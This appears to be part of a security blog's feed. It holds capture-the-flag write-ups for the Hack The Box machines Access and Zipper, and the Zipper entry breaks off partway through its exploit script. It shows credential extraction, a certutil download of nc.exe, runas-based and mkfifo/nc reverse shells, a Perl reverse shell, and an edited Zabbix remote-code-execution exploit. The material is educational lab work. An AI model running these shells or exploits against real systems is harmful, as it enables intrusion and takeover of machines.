&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Access retired and this is my write-up. I don’t have too much to say about this box , It was a nice easy windows box and a good example of using runas in windows , Which is like sudo in linux and doas in openbsd (we used doas in Ypuffy). It’s a windows box and its ip is 10.10.10.98 , I added it to /etc/hosts as access.htb Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC access.htb Nmap tells us that there’s ftp running on port 21 , telnet on port 23 and http on port 80. It also tells us that we can login anonymously to ftp. Let’s look at http first. HTTP Enumeration We get this page titled as “MegaCorp” and it only has this image : Sub directories enumeration with gobuster and common.txt (/usr/share/wordlists/dirb/common.txt in kali) only gave us 2 pages , /aspnet_client and /index.html /aspnet_client gave us 403 Forbidden : And /index.html is of course the main page we saw earlier : So now we know that http has nothing , Next thing to check is ftp FTP Enumeration Nmap told us earlier that anonymous login on ftp was allowed , After we login we find 2 directories Backups and Engineer In Backups there is only one file called backup.mdb , we will type binary to set the transfer mode to binary , so we won’t get a corrupted file. Then get backup.mdb to download it : And in Engineer there’s a file called Access Control.zip : Extracting credentials from backup.mdb and getting User backup.mdb is a Microsoft Access Database , we can check using file : We need mdbtools to deal with this database , it can be installed with apt apt-get install mdbtools We will use mdb-tables to get the table names : There’s an interesting table named auth_user , We will use mdb-export to get the contents of that table : mdb-export backup.mdb auth_user And it gave us some credentials : admin : admin engineer : access4u@security backup_admin : admin By looking at the other zip file we will find a file called Access Control.pst and it’s a password protected file. We already have 2 passwords : admin and access4u@security. access4u@security is the right password. Access Control.pst is a Microsoft Outlook email folder : We can use a tool called readpst to be able to read the file : readpst Access\ Control.pst It will create another file called Access Control.mbox , Let’s cat that file : The very first thing we see is this email which has credentials for an account called security , password : 4CcessC0ntr0ller Let’s telnet into the box with those credentials : telnet access.htb And we owned user ! runas and Privilege Escalation As always we will start enumerating the filesystem , There are only 3 users on the box Administrator , Public and security. We are in as security and we can’t go into Administrator’s directory so let’s check Public. In the Desktop of Public there’s a lnk called ZKAccess3.5 Security System. Let’s type it and see what’s inside it : Of course not the best output , because it’s a lnk file not a txt file , but we can read some stuff , and we notice that there’s a runas command being excuted as administrator. runas allows us to run commands as another user and the option /savecred allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing net user administrator Password required is set to No , If this was set to Yes we wouldn’t be able to use runas as administrator without knowing the password , However that lnk file on Public’s desktop was a nice hint. Now we can run a simple HTTP server on our box with python and host nc.exe : python -m SimpleHTTPServer 80 80 is the port number and it can be anything You can get nc.exe from github here , I also remember that I included another link in SecNotes write-up Then we will download it on the box : certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe After that we will set up our nc listener nc -lvnp 1337 1337 is the port number and it can be anything. Finally we will use runas to get a reverse shell : runas /user:Administrator /savecred &quot;nc.exe -c cmd.exe 10.10.xx.xx 1337&quot; Let’s check our listener : We have a shell. And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Zipper Next Hack The Box write-up : Hack The Box - Ethereal</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/access/0.png" /></entry><entry><title type="html">Hack The Box - Zipper</title><link href="http://localhost:4000/hack-the-box/zipper/" rel="alternate" type="text/html" title="Hack The Box - Zipper" /><published>2019-02-23T00:00:00+02:00</published><updated>2019-02-23T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/zipper</id><content type="html" xml:base="http://localhost:4000/hack-the-box/zipper/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-zipper-retired-and-heres-my-write-up-owning-user-on-this-box-was-challenging-because-we-have-to-exploit-an-rce-vulnerability-which-is-not-really-easy-and-then-we-have-to-get-a-stable-shell-to-be-able-to-enumerate-for-the-privilege-escalation-it-was-easy-but-i-also-liked-it-because-it-was-a-binary-exploitation-it-was-a-very-fun-box-and-i-liked-it-its-a-linux-box-and-its-ip-is-101010108--i-added-it-to-etchosts-as-zipperhtb-lets-jump-right-in&quot;&gt;Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.108&lt;/code&gt; , I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;zipper.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC zipper.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-only-get-2-ports--http-on-port-80-and-ssh-on-port-22-so-we-are-going-to-check-http&quot;&gt;We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP enumeration&lt;/h3&gt;
&lt;h4 id=&quot;by-visiting-zipperhtb-we-get-the-default-apache2-page-&quot;&gt;By visiting &lt;code class=&quot;highlighter-rouge&quot;&gt;zipper.htb&lt;/code&gt; we get the default apache2 page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-im-going-to-run-gobuster-with-directory-list-23-mediumtxt-to-see-if-there-are-any-sub-directories-&quot;&gt;So I’m going to run &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;directory-list-2.3-medium.txt&lt;/code&gt; to see if there are any sub directories :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;output-&quot;&gt;Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://zipper.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/02/22 08:50:38 Starting gobuster
=====================================================
/zabbix (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-zabbix--lets-look-at-that-in-the-browser-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;/zabbix&lt;/code&gt; , let’s look at that in the browser :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-this-login-page--we-dont-have-credentials-but-down-there-theres-an-option-to-sign-in-as-a-guest--but-before-we-do-that-lets-get-an-idea-about-zabbix&quot;&gt;We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix&lt;/code&gt;&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -&lt;a href=&quot;https://en.wikipedia.org/wiki/Zabbix&quot;&gt;Wikipedia&lt;/a&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;so-basically-its-a-server-monitoring-tool--lets-login-as-a-guest-and-see-what-we-can-get&quot;&gt;So basically it’s a server monitoring tool , let’s login as a guest and see what we can get&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-this-dashboard--but-we-are-not-privileged-to-do-anything-because-we-are-guest&quot;&gt;We get this dashboard , but we are not privileged to do anything because we are &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-some-enumeration-we-will-notice-in--monitoring--latest-data--zappers-backup-script&quot;&gt;After some enumeration we will notice in : Monitoring –&amp;gt; Latest data , &lt;code class=&quot;highlighter-rouge&quot;&gt;Zapper's Backup Script&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-a-potential-username---zapper--we-can-try-to-brute-force-or-fuzz-the-password--but-a-quick-guess-worked-for-me--the-username-is-the-password-zapper--zapper&quot;&gt;Now we have a potential username :  &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper&lt;/code&gt; , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper : zapper&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;gui-access-disabled--on-exploit-db-theres-an-authenticated-remote-code-execution-exploit-for-an-old-version-of-zabbix--check-it-here--unfortunately-valid-credentials-are-not-enough-to-exploit-it--if-we-take-a-look-here-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GUI access disabled&lt;/code&gt; , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it &lt;a href=&quot;https://www.exploit-db.com/exploits/39937&quot;&gt;here&lt;/a&gt; , Unfortunately valid credentials are not enough to exploit it , if we take a look here :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-also-need-hostid--and-to-get-that-we-need-to-get-gui-access&quot;&gt;We also need &lt;code class=&quot;highlighter-rouge&quot;&gt;hostid&lt;/code&gt; , and to get that we need to get GUI access&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gui-access-through-zabbix-cli&quot;&gt;GUI access through zabbix-cli&lt;/h3&gt;
&lt;h4 id=&quot;theres-a-cli-tool-for-zabbix-on-github--we-can-use-it-to-gain-gui-access-installation-and-configuration-is-simple-you-will-get-the-source-from-github-then-install-it-with-installpy-install-then-you-will-create-a-conf-file-for-it-by-executing-zabbix-cli---config-it-will-be-saved-in--homezabbix-clizabbix-cliconf--open-the-conf-file-and-in-zabbix-api-section-add-this-line-zabbix_api_urlhttp101010108zabbix-for-details-read-the-documentation-here&quot;&gt;There’s a cli tool for zabbix on &lt;a href=&quot;https://github.com/usit-gd/zabbix-cli&quot;&gt;github&lt;/a&gt; , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with &lt;code class=&quot;highlighter-rouge&quot;&gt;install.py install&lt;/code&gt; then you will create a &lt;code class=&quot;highlighter-rouge&quot;&gt;conf&lt;/code&gt; file for it by executing &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix-cli --config&lt;/code&gt;, it will be saved in  &lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME/.zabbix-cli/zabbix-cli.conf&lt;/code&gt; , open the &lt;code class=&quot;highlighter-rouge&quot;&gt;conf&lt;/code&gt; file and in Zabbix API section add this line &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix_api_url=http://10.10.10.108/zabbix&lt;/code&gt;. For details read the documentation &lt;a href=&quot;https://github.com/usit-gd/zabbix-cli/blob/master/docs/manual.rst#installing-from-source&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-will-run-zabbix-cli-it-will-ask-for-a-username-and-a-password--we-already-have-them-zapper--zapper&quot;&gt;Then we will run &lt;code class=&quot;highlighter-rouge&quot;&gt;zabbix-cli&lt;/code&gt; it will ask for a username and a password , we already have them &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper : zapper&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;if-we-executed-show_usergroups-we-will-see-that-zapper-is-in-a-group-called-no-access-to-the-fronted-and-gui-access-to-that-group-is-disabled&quot;&gt;if we executed &lt;code class=&quot;highlighter-rouge&quot;&gt;show_usergroups&lt;/code&gt; we will see that &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper&lt;/code&gt; is in a group called &lt;code class=&quot;highlighter-rouge&quot;&gt;No access to the fronted&lt;/code&gt; and GUI access to that group is disabled&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-create-a-new-group-and-call-it-guiaccess-and-leave-gui-access-as-system-default&quot;&gt;We will create a new group and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;guiaccess&lt;/code&gt; and leave GUI access as system default&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;create_usergroup&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-add-zapper-to-that-group-and-delete-him-from-no-access-to-the-fronted&quot;&gt;Then we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper&lt;/code&gt; to that group and delete him from &lt;code class=&quot;highlighter-rouge&quot;&gt;No access to the fronted&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;add_user_to_usergroup&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/11.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;remove_user_from_usergroup&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/zipper/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-if-we-try-to-login-again-as-zapper-we-will-get-the-dashboard-&quot;&gt;Now if we try to login again as &lt;code class=&quot;highlighter-rouge&quot;&gt;zapper&lt;/code&gt; we will get the dashboard :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-and-getting-user&quot;&gt;RCE and getting user&lt;/h3&gt;
&lt;h4 id=&quot;from-configuration--hosts-we-have-2-hosts-and-the-second-one-is-the-availabe-one-&quot;&gt;From Configuration –&amp;gt; Hosts we have 2 hosts and the second one is the availabe one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-click-on-it-we-will-get-an-edit-page--but-we-will-notice-that-the-host-id-is-included-in-the-url-as-a-get-parameter-&quot;&gt;If we click on it we will get an edit page , but we will notice that the &lt;code class=&quot;highlighter-rouge&quot;&gt;host id&lt;/code&gt; is included in the url as a GET parameter :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-edit-the-python-exploit-and-add-the-host-id--10106--this-is-how-the-basic-login-info-in-the-script-will-look-like-&quot;&gt;Now we can edit the python exploit and add the host id : &lt;code class=&quot;highlighter-rouge&quot;&gt;10106&lt;/code&gt; , this is how the basic login info in the script will look like :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-a-decent-shell--but-this-shell-executes-commands-through-api-requests-which-is-not-efficient--so-we-will-get-a-reverse-shell-like-this-&quot;&gt;And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-this-shell-from-payload-all-the-things&quot;&gt;I got this shell from &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;payload all the things&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;problem-is--we-will-find-that-we-are-in-a-docker-container--and-thats-actually-a-bad-rabbit-hole-and-when-i-was-doing-this-box-for-the-first-time-i-spent-a-lot-of-time-trying-to-escape-this-docker-container--and-eventually-i-found-out-that-this-is-the-wrong-server&quot;&gt;Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-this-page-from-zabbix-documentation--this-part-&quot;&gt;If we take a look at &lt;a href=&quot;https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object&quot;&gt;this page&lt;/a&gt; from zabbix documentation , this part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-an-option-called-execute_on--which-has-2-possible-values--0-to-execute-on-zabbix-agent--and-1-to-execute-on-zabbix-server-we-dont-have-that-option-included-in-the-exploit-so-we-are-using-the-default-option-1-which-means-we-are-executing-commands-on-zabbix-server-so-we-will-edit-the-exploit-json-data-and-add-execute_on--0-in-those-2-parts-&quot;&gt;there’s an option called &lt;code class=&quot;highlighter-rouge&quot;&gt;execute_on&lt;/code&gt; , which has 2 possible values : &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to execute on zabbix agent , and &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; which means we are executing commands on zabbix server. So we will edit the exploit json data and add &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;execute_on&quot; : &quot;0&quot;&lt;/code&gt; in those 2 parts :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/22.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/zipper/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-run-the-exploit-again-and-now-it-will-run-on-the-right-server--however-the-shell-that-we-used-before-didnt-work-and-died-immediately-because-the-exploit-crashed-for-some-reason--i-had-to-comment-out-the-last-line-which-prints-the-result--print-cmd_exeresultvalue--but-it-didnt-fix-it--so-i-tried-some-other-shells-and-the-perl-one-worked-&quot;&gt;After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : &lt;code class=&quot;highlighter-rouge&quot;&gt;print cmd_exe[&quot;result&quot;][&quot;value&quot;]&lt;/code&gt; , but it didn’t fix it , so I tried some other shells and the &lt;code class=&quot;highlighter-rouge&quot;&gt;perl&lt;/code&gt; one worked :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;10.10.xx.xx&quot;;$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-used-used-python3-pty-to-get-a-proper-shell--python2-didnt-exist-on-the-server&quot;&gt;Then I used used &lt;code class=&quot;highlighter-rouge&quot;&gt;python3&lt;/code&gt; pty to get a proper shell , python2 didn’t exist on the server&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/zipper/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;final-exploit-after-edits-&quot;&gt;Final exploit after edits :&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Exploit Title: Zabbix RCE with API JSON-RPC&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Date: 06-06-2016&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Exploit Author: Alexander Gurin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Vendor Homepage: http://www.zabbix.com&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Software Link: http://www.zabbix.com/download.php&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Version: 2.2 - 3.0.3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Tested on: Linux (Debian, CentOS)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# CVE : N/A&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;readline&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ZABIX_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://10.10.10.108/zabbix'&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;### Zabbix IP-address&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZABIX_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/api_jsonrpc.php'&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;### Don't edit&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'zapper'&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;### Zabbix login&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'zapper'&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;### Zabbix password&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hostid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10106'&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;### Zabbix hostid&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;### auth&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;jsonrpc&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;method&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;user.login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;auth&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'content-type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

